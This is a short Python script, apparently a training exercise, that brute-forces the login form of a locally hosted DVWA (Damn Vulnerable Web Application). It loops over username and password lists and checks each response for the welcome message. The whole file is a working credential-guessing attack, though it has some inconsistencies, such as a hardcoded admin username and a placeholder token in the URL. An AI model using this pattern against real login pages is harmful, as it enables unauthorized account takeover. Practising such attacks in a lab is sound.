import requests
from bs4 import BeautifulSoup as Soup

def bruteforce():
    logins = []
    with open("logins.txt", "r") as logins_file:
        logins = [line.strip() for line in logins_file.readlines()]
        print(logins)

    passwords = []
    with open("passwords.txt", "r") as passwords_file:
        passwords = [line.strip() for line in passwords_file.readlines()]
        print(passwords)

    for login in logins:
        for password in passwords:
            param = {
                "username": login,
                "password": password,
                "Login": "Login",
                "user_token": "c1368edf766970c4532d39bccd92513d"
            }
            url_1 = f'http://localhost/DVWA/vulnerabilities/brute/?username=admin&password={password}&user_token=TOKEN&Login=Login'
            response = requests.get(url_1, params=param)
            soup = Soup(response.content, features="lxml")
            #print(soup)
            is_success = soup.find(string="Welcome to the password protected area admin")
            if is_success:
                print("Success\nlogin: {}, password: {}".format(login, password))
                return True
    return False

if __name__ == '__main__':
    done = bruteforce()
    if not done:
        print("Failed")
    else:
        print("Done")